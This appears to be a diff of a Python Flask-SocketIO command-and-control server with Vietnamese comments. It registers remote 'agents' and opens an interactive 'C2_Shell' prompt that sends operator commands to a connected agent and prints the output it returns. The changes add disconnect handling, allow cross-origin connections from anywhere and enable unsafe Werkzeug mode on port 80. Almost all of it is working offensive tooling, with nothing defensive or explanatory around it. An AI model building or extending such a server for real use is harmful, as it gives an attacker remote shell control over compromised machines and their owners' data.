@@ -3,72 +3,68 @@ from flask_socketio import SocketIO, emit
 import threading
 import time
 
+# khoi tao server
 app = Flask(__name__)
-app.config['SECRET_KEY'] = 'secret!' 
-socketio = SocketIO(app)
+app.config['SECRET_KEY'] = 'secret!'
+socketio = SocketIO(app, cors_allowed_origins='*') # cho phep moi ket noi
 
-# bo nho tam thoi (RAM)
-# agents = { "uuid": { "info": {...}, "sid": "session_id_xyz" } }
+# bo nho quan ly agents
 agents = {}
 
 @socketio.on('connect')
 def handle_connect():
-    print(f"[+] Client connected: {request.sid}")
+    print(f"[+] client connected: {request.sid}")
+
+@socketio.on('disconnect')
+def handle_disconnect():
+    # tim va xoa agent da ngat ket noi khoi danh sach
+    disconnected_sid = request.sid
+    for agent_id, info in list(agents.items()):
+        if info['sid'] == disconnected_sid:
+            print(f"[-] agent disconnected: {agent_id}")
+            del agents[agent_id]
+            break
 
 @socketio.on('register')
 def handle_register(data):
-    # data là JSON do agent gui len: {"agent_id": "...", "hostname": "..."}
     agent_id = data.get('agent_id')
-    
-    if agent_id:
-        # luu session id moi nhat de co the gui lenh nguoc lai (interactive shell)
-        current_sid = request.sid
-        
-        # cap nhat thong tin vao bo nho
-        agents[agent_id] = {
-            "info": data,
-            "sid": current_sid, 
-            "status": "online"
-        }
-        
-        print(f"[*] Agent Registered: {agent_id} | Host: {data.get('hostname')} | SID: {current_sid}")
-        
-        # gui tin hieu xac nhan cho agent: "ok, server da xac nhan"
-        emit('server_ack', {'status': 'registered', 'message': 'Welcome to C2'})
+    agents[agent_id] = {
+        "sid": request.sid,
+        "info": data
+    }
+    print(f"[*] new agent registered: {agent_id} | sid: {request.sid}")
 
-# lang nghe de nhan command output tu agent
 @socketio.on('command_result')
-def handle_command_result(data):
-    agent_id = data.get('agent_id')
-    result = data.get('result')
-    
-    print(f"[*] received result from [{agent_id}]:")
-    print(result)
+def handle_result(data):
+    print(f"\n[v] result from {data.get('agent_id')}:\n{data.get('output')}")
+    print("C2_Shell > ", end="", flush=True) # in lai dau nhac lenh cho dep
 
 def cmd_interface():
+    time.sleep(2) # doi server khoi dong
     while True:
-        cmd = input("C2_Shell > ")
-        if cmd == 'exit':
-            break
+        try:
+            if not agents:
+                print("[!] waiting for agents...", end="\r")
+                time.sleep(1)
+                continue
+
+            cmd = input("\nC2_Shell > ")
+            if not cmd: continue
             
-        if agents:
-            # lay id cua agent dau tien trong danh sach
+            # lay agent dau tien de test
             target_id = list(agents.keys())[0]
+            sid = agents[target_id]['sid']
             
-            # lay sid tuong ung tu dictionary agents
-            target_sid = agents[target_id]["sid"]
+            socketio.emit('execute_command', {'cmd': cmd}, room=sid)
+            print(f"[*] sent '{cmd}' to {target_id}...")
             
-            # gui lenh di voi tham so room
-            socketio.emit('execute_command', {'cmd': cmd}, room=target_sid)
-            print(f"[*] sent command to {target_id}")
-        else:
-            print("[!] no agents connected yet.")
+        except Exception as e:
+            print(f"[!] shell error: {e}")
 
 if __name__ == '__main__':
-    # khoi tao luong nhap lieu
-    t = threading.Thread(target=cmd_interface)
+    # chay luong nhap lieu rieng
+    t = threading.Thread(target=cmd_interface, daemon=True)
     t.start()
-
-    print("[*] Starting C2 Server with WebSockets...")
-    socketio.run(app, port=80, debug=False)
-    #debug=False de tranh xung dot voi thread input
+    
+    print("[*] c2 server listening on port 80...")
+    socketio.run(app, port=80, debug=False, allow_unsafe_werkzeug=True)
